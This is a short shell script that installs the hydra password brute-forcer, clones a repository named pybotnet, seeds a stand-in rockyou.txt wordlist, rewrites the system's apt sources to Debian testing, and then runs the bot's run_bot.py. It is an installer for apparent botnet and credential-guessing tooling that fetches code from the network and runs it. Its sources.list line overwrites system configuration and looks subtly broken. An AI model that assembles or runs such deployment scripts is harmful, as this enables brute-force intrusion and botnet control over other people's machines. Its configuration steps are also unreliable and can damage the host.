#!/bin/sh
sudo apt-get install git hydra python3 python3-pip
git clone https://github.com/laudecay/pybotnet.git
echo 'password' > pybotnet/rockyou.txt
sudo echo 'deb http://ftp.de.debian.org/debian testing main' > /etc/apt/sources.list
sudo echo 'APT::Default-Release "stable";' | sudo tee -a /etc/apt/apt.conf.d/00local
sudo apt-get update
sudo apt-get -t testing install python3.6
cd pybotnet
pip3 install -r requirements.txt
python3 run_bot.py
